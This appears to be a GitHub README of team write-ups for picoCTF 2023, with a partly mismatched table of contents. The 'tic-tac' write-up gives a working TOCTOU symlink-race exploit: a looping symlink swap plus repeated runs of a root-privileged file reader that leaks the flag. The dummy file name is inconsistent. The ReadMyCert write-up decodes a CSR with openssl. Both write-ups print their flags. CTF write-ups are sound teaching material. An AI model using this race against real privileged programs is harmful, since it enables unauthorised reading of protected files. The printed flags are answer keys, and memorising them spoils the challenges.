# picoCTF2023-Writeups
A list of writeups from the 2023 PicoCTF hacking competition from team cvhs_exe.

(Follow this format pls)

<details open><summary>
	
### [Binary Exploitation](https://github.com/TrooperZ/picoCTF2023-Writeups/blob/main/README.md#binary-exploitation):
	
</summary>
	
- [two-sum](https://github.com/TrooperZ/picoCTF2023-Writeups/blob/main/README.md#two-sum)
- [babygame01](https://github.com/TrooperZ/picoCTF2023-Writeups/blob/main/README.md#babygame01)
- [tic-tac](https://github.com/TrooperZ/picoCTF2023-Writeups/blob/main/README.md#tic-tac)
- [VNE](https://github.com/TrooperZ/picoCTF2023-Writeups/blob/main/README.md#vne)
- [hijacking](https://github.com/TrooperZ/picoCTF2023-Writeups/blob/main/README.md#hijacking)
- [babygame02](https://github.com/TrooperZ/picoCTF2023-Writeups/blob/main/README.md#babygame02)
- [two-sum](https://github.com/TrooperZ/picoCTF2023-Writeups/blob/main/README.md#two-sum)
- [Horsetrack](https://github.com/TrooperZ/picoCTF2023-Writeups/blob/main/README.md#horsetrack)

	
</details>


<details open><summary>
	
### [Cryptography](https://github.com/TrooperZ/picoCTF2023-Writeups/blob/main/README.md#cryptography):
	
</summary>
	
- [ReadMyCert](https://github.com/TrooperZ/picoCTF2023-Writeups/blob/main/README.md#readmycert)
- [rotation](https://github.com/TrooperZ/picoCTF2023-Writeups/blob/main/README.md#rotation)
- [HideToSee](https://github.com/TrooperZ/picoCTF2023-Writeups/blob/main/README.md#tic-tac)
- [VNE](https://github.com/TrooperZ/picoCTF2023-Writeups/blob/main/README.md#HideToSee)
- [PowerAnalysis: Warmup](https://github.com/TrooperZ/picoCTF2023-Writeups/blob/main/README.md#poweranalysis:-warmup)
- [PowerAnalysis: Part 1](https://github.com/TrooperZ/picoCTF2023-Writeups/blob/main/README.md#poweranalysis:-part-1)
- [SRA](https://github.com/TrooperZ/picoCTF2023-Writeups/blob/main/README.md#sra)
- [Poweranalysis:-part-1](https://github.com/TrooperZ/picoCTF2023-Writeups/blob/main/README.md#poweranalysis:-part-1)

	
</details>


# Binary Exploit

(Add the stuff yall did as well)


## tic-tac
###  200 Points | Solved By TrooperZ
#### [View Question in Pico Gym](https://play.picoctf.org/practice/challenge/380?category=6&originalEvent=72&page=1)

AUTHOR: JUNIAS BONOU

### Description:

Someone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it.

SSH to `saturn.picoctf.net`, port `[port provided by instance]`, and run the binary named `txtreader` once connected. Login as `ctf-player` with the password, `[password provided by instance]`

Tags: picoCTF 2023, Binary Exploitation, linux, bas, toctou

Hints: 
- None.

### Solution: 

Upon loading up to the ssh, we looked at 3 useful files with `ls`: 
```
flag.txt  src.cpp  txtreader
```

As expected, we didn't have access to `flag.txt`. `txtreader` didn't let us open it either, so we peeked in the source code provided.
```
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
  if (argc != 2) {
    std::cerr << "Usage: " << argv[0] << " <filename>" << std::endl;
    return 1;
  }

  std::string filename = argv[1];
  std::ifstream file(filename);
  struct stat statbuf;

  // Check the file's status information.
  if (stat(filename.c_str(), &statbuf) == -1) {
    std::cerr << "Error: Could not retrieve file information" << std::endl;
    return 1;
  }

  // Check the file's owner.
  if (statbuf.st_uid != getuid()) {
    std::cerr << "Error: you don't own this file" << std::endl;
    return 1;
  }

  // Read the contents of the file.
  if (file.is_open()) {
    std::string line;
    while (getline(file, line)) {
      std::cout << line << std::endl;
    }
  } else {
    std::cerr << "Error: Could not open file" << std::endl;
    return 1;
  }

  return 0;
}

```

As said in the name and tags, there's a [TOCTOU](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use) vulnerability, where the file is opened before it checks for permissions when the file is read. This is easily exploitable through a handy dandy feature called [symbolic links](https://en.wikipedia.org/wiki/Symbolic_link). A symbolic link to a file is created with this command `ln -s [original file] [linked file]`. You may need to change `-s` to `-sf` to force it if the file exists.

Through this, we create our own file which we have permissions to read to with `echo OurFile > notflag.txt`. 

Then, we write a bash one-liner to create a link file and swap the linkage to the file between the flag and our dummy file. This way, we can change the ownership of the file right after it's opened and read into the memory of the program.
```
while true; do ln -sf flag.txt linky; ln -sf file.txt linky; done &
```

This will run in the background while we try to access the file. Now we have to read the file. To do so we simply run the `txtreader` repeatedly until it leaks the flag. 
```
for i in {1..30}; do ./txtreader linky; done 
```
You may have to run it a few times to get it to work.
```
...
OurFile
OurFile
Error: you don't own this file
Error: you don't own this file
OurFile
OurFile
OurFile
OurFile
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
OurFile
Error: you don't own this file
picoCTF{ToctoU_!s_3a5y_f482a247}
OurFile
OurFile
Error: you don't own this file
Error: you don't own this file
...
```
More info here: https://samsclass.info/127/proj/E10.htm

___

# Cryptography

## ReadMyCert
###  100 Points | Solved By TrooperZ
#### [View Question in Pico Gym](https://play.picoctf.org/practice/challenge/367?originalEvent=72&page=1)

AUTHOR: SUNDAY JACOB NWANYIM

### Description:

How about we take you on an adventure on exploring certificate signing requests
Take a look at this CSR file [here](https://github.com/TrooperZ/picoCTF2023-Writeups/blob/main/Cryptography/ReadMyCert/readmycert.csr)

Tags: picoCTF 2023, Cryptography

Hints: 
- Download the certificate signing request and try to read it.

### Solution: 

Simply check the CSR with OpenSSL or any other tool:
```
openssl req -in readmycert.csr -noout -text
```
This website also does the trick: https://www.sslshopper.com/csr-decoder.html

The common name is the flag: picoCTF{read_mycert_41d1c74c}

___
